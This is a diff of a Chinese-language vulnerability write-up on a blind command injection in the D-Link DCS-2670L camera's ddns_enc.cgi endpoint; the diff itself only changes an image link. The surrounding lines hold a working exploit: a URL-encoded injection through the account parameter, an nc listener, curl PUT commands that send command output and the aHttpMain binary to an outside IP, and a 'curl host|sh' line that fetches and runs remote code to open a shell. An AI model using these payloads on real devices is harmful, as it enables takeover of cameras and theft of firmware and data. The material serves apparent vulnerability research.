@@ -20,7 +20,7 @@ DCS-2670L v2.02 & older
 由于注入无回显,所以用curl的方法让被测机器向我们的服务端发送数据来显示注入结果:在本地``nc -lvp 11451``
 首先通过
 ``http://2remoteip/cgi-bin/ddns_enc.cgi?enable=1&hostname=qq&interval=24&servername=www.dlinkddns.com&provider=custom&account=;ls >a;curl%20-X%20PUT%201local ip:localport%20-T%20a;``来找命令执行的根目录.本地接收到请求:
-![e1b923f15ae329ef1e0445d0b21a9360.png](en-resource://database/3444:1)
+![e1b923f15ae329ef1e0445d0b21a9360.png](1.png)
 通过``;curl  local ip:localport|sh``来弹出无回显远程shell;
 找出关键二进制程序在``execs/``中,通过服务端``nc -lvp 11451 >aHttpMain``,注入点``;curl%20-X%20PUT%20121.36.223.38:12668%20-T%20/execs/aHttpMain;``将aHttpMain提取出来
 
